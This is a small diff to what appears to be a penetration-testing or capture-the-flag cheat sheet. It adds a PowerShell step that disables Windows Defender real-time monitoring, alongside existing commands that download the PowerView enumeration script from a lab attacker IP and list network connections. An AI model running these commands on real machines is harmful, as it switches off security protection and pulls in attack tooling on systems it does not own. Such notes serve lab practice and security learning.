@@ -2,6 +2,12 @@
 Invoke-WebRequest -Uri http://10.10.14.176:8000/PowerView.ps1 -OutFile PowerView.ps1
 ```
 
+Disable AV
+```powershell
+# Disable real-time protection 
+Set-MpPreference -DisableRealtimeMonitoring $true
+```
+
 ```Powershell
 netstat -aon
 ```
